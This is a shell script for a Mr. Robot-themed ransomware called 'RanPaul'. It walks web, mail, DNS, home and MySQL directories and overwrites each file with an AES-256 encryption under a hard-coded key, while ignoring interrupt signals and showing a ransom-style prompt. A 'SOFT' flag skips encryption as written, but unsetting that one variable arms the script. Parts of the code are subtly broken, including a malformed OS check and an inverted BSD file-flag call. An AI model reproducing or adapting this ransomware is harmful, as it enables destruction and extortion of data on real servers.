#!/bin/sh
# Global Vars
ERRMSG=""
OS=""
################ CHECKS ###############################
get_os() {
	if [[$(uname -s | grep Linux) != ""]]; then
		OS="linux"
	elif [[ $( uname -s | grep BSD) != "" ]]; then
		OS="bsd"
	else
		adderr "[!] NOT \"Linux\" or \"BSD\""
		EXIT
	fi
}
noopenssl() {
	adderr "[!] NO OPENSSL FOUND"
	EXIT
}
notroot() {
	adderr "[!] NOT ROOT"
	EXIT
}
check_msg() {
if [ "$(which dialog)" != "" ]; then
	DIALOG=dialog
elif [ "$(which whiptail)" != "" ]; then
	DIALOG=whiptail
else
	DIALOG=none
fi
}
check_req() {
	# check the requirements
	if [ "$(whoami)" != "root" ]; then
		notroot
	fi
	if [ "$(which openssl)" = "" ]; then
		noopenssl
	fi
}
################ FUNCTIONS ##########################
openfile() {
	if [ "$OS" == "linux" ]; then
		chmod +rw $1
		chattr -i $1
	fi
	if [ "$OS" == "bsd" ]; then
		chmod +rw $1
		chflags schg $1
	fi
}
adderr() { ERRMSG="$ERRMSG\n$1"; }
EXIT() { echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"; exit; }
init() {
	check_req
	check_msg
	KEY="PASSWORD"
}
navdir() {
for fil in $1; do
	whitelist=".*vmware.*|.*_schema.*"
	fil=$(echo $fil | awk "!/$whitelist/") # remove anything containing vmware
	if [ -f "$fil" ]; then
		$2 $fil
	elif [ -d "$fil" ]; then
		navdir "$fil/*" "$2"
	fi
done
}
showmess() {
case "$DIALOG" in
*none*)
	reset
	echo $2 "(y/N)"
	read result
	;;
*)
	$DIALOG --backtitle "RanPaul 0.0.1" \
       		--title "$1" \
       		--yesno "$2" 18 60
        result=$?
	;;
esac
case "$result" in
Yes|Y|y)
	echo You got the files, pal! goodbye now..
	break
	;;
0)
	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "You got the files now, pal!\n\nGoodbye Elliot..." 10 50
	break
	;;	
1)
	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "Well Elliot,\n\nThe files are gone. You're gonna have to figure something out..." 10 50
	EXIT
	;;	
*)
	echo "Well buddy, the files are gone. Youre gonna have to figure something out here...!"
	EXIT
	;;
esac
}
############### ENCRYPTING ###########################
pck() {
	if [ "$SOFT" = "" ]; then
	openfile $1
	stuff=$(cat $1)
	echo "RAN" > $1
	echo -e "$stuff" | openssl aes-256-cbc -k $KEY -out $1 &>/dev/null
	if [ ! -f "$1" ]; then
		adderr "[!] FILE NOT ENCRYPTED"
		EXIT
	fi
	fi
}
enc_loop() {
	kills="$1"
	for i in $kills; do
		if [ -d "$i" ]; then
			navdir "$i/*" "pck"
			adderr "[+] Encrypted $i"
			#} | $DIALOG --gauge "Encrypting Files..." 10 50 0
		fi
	done
}
################## DECRYPT ################################
dec() {
	PRIVATEKEY="private.key"
	echo "$KEY" > $PRIVATEKEY
}
upk() {
	if [ "$SOFT" = "" ]; then
	openssl aes-256-cbc -d -kfile $PRIVATEKEY -in $1 -out $1.dec &>/dev/null
	mv $1.dec $1
	fi
}
dec_loop() {
	dec
	kills="$1"
	for i in $kills; do
		if [ -d "$i" ]; then
			navdir "$i/*" "upk"
			adderr "[+] Decrypted $i"
		fi
	done
}
################# MAIN ######################################
main() {
	trap '' INT
	trap '' TERM
	SOFT="YES"
	init
	targets="/var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
	enc_loop "$targets"
	message="Congratulations Elliot,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\n\nLove, Mr. Robot\n\n\nKeep the files?"
	title="Oops.."
	showmess "$title" "$message"
	dec_loop "$targets"
	EXIT
}
main
